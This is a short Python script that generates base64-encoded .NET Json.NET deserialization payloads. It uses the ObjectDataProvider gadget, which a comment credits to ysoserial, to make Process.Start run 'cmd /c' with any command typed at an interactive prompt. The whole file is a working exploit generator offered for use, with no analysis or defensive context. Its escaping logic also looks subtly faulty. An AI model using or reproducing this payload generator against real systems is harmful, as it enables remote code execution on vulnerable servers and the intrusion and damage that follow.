#!/usr/bin/env python3
import base64
from string import Template

#raw dump of exploit from ysoserial
payloadTemp = Template('''{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c $cmd']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}''')

def generate(cmd):
    cmd = cmd.strip()
    cmd = cmd.replace("'", "\'")
    cmd = cmd.replace("\"", "\\\"")
    cmd = cmd.replace("\\", "\\\\")
    #print(cmd)
    payload = payloadTemp.safe_substitute({'cmd': cmd})
    payloadEnc = str(base64.b64encode(payload.encode("utf-8")), "utf-8")
    print(payloadEnc)

if __name__ == '__main__':
    while True:
        cmd = input("CMD> ")
        generate(cmd)
